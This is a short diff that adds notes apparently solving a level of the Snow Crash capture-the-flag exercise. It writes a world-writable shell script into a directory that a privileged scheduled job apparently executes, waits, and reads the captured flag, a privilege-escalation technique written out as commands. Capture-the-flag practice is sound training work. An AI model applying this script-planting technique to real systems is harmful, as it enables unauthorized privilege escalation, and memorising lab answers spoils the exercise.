@@ -1,0 +1,4 @@
+[snowcrash]
+echo "getflag > /tmp/pasta" > /opt/openarenaserver/hehe.sh && chmod 777 /opt/openarenaserver/hehe.sh
+WAIT 30 SECONDS
+cat /tmp/pasta
